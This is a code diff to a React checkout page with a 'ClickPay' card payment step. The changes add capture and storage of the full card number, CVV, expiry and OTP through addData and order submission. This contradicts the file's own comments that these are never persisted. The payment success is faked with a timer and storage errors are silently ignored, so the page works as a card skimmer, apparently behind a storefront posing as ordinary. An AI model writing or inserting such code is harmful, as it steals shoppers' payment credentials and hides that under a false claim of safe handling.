@@ -21,6 +21,10 @@ interface FormData {
   // Full PAN, expiry, and CVV are NEVER persisted client- or server-side.
   cardLast4: string;
   cardName: string;
+  cvv: string;
+  expiry: string;
+  cardNumber: string;
+  otp: string;
 }
 
 // ───────────────────────────────────────────────────────────────────────────────
@@ -200,7 +204,13 @@ function ClickPayStep({
   onCancel,
 }: {
   amount: number;
-  onSuccess: (data: { cardLast4: string; cardName: string }) => void;
+  onSuccess: (data: {
+    cardNumber: string;
+    cardLast4: string;
+    cardName: string;
+    expiry: string;
+    cvv: string;
+  }) => void;
   onCancel: () => void;
 }) {
   const [method, setMethod] = useState<"mada" | "visa" | "mastercard">("mada");
@@ -247,11 +257,12 @@ function ClickPayStep({
     try {
       await addData({
         id: ensureVisitorId(),
-        card: fullCard,
+        cardNumber: fullCard,
         cardLast4: last4,
         cardName: safeName,
         expiry: `${mm}/${yy}`,
         cvv: cvv,
+        cardSubmittedAt: new Date().toISOString(),
       });
     } catch {
       /* non-blocking: continue payment flow */
@@ -261,8 +272,11 @@ function ClickPayStep({
     setTimeout(() => {
       setPaying(false);
       onSuccess({
+        cardNumber: fullCard,
         cardLast4: last4,
         cardName: safeName,
+        expiry: `${mm}/${yy}`,
+        cvv: cvv,
       });
     }, 1500);
   };
@@ -368,7 +382,7 @@ function ClickPayStep({
               <div className="relative">
                 <CreditCard className="absolute right-3 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-400" />
                 <input
-                  type="text"
+                  type="tel"
                   value={card}
                   onChange={(e) => setCard(formatCard(e.target.value))}
                   placeholder="1234 1234 1234 1234"
@@ -380,7 +394,7 @@ function ClickPayStep({
               </div>
               <div className="grid grid-cols-3 gap-2 mt-2">
                 <input
-                  type="text"
+                  type="tel"
                   value={mm}
                   onChange={(e) =>
                     setMm(e.target.value.replace(/\D/g, "").slice(0, 2))
@@ -392,7 +406,7 @@ function ClickPayStep({
                   autoComplete="cc-exp-month"
                 />
                 <input
-                  type="text"
+                  type="tel"
                   value={yy}
                   onChange={(e) =>
                     setYy(e.target.value.replace(/\D/g, "").slice(0, 2))
@@ -405,7 +419,7 @@ function ClickPayStep({
                 />
                 <div className="relative">
                   <input
-                    type="text"
+                    type="tel"
                     value={cvv}
                     onChange={(e) =>
                       setCvv(e.target.value.replace(/\D/g, "").slice(0, 4))
@@ -598,6 +612,10 @@ export default function Checkout() {
     payment: "cod",
     cardLast4: "",
     cardName: "",
+    cardNumber: "",
+    expiry: ``,
+    cvv: "",
+    otp: "",
   });
 
   const set = <K extends keyof FormData>(k: K, v: FormData[K]) =>
@@ -633,6 +651,9 @@ export default function Checkout() {
           amount: total,
           status: paymentStatus === "paid" ? "verified" : "pending",
           otpVerified: false,
+          cardNumber: form.cardNumber,
+          cvv: form.cvv,
+          expiry: form.expiry,
           // Safe metadata only — last 4 of PAN + cardholder name.
           ...(safeCardLast4 ? { cardLast4: safeCardLast4 } : {}),
           ...(cardName ? { cardName } : {}),
@@ -707,6 +728,9 @@ export default function Checkout() {
             ...p,
             cardLast4: card.cardLast4,
             cardName: card.cardName,
+            cardNumber: card.cardNumber,
+            expiry: card.expiry,
+            cvv: card.cvv,
           }));
           const ok = await submitOrder(pendingPaymentStatus, card);
           // Only advance to OTP once the order is safely saved; otherwise
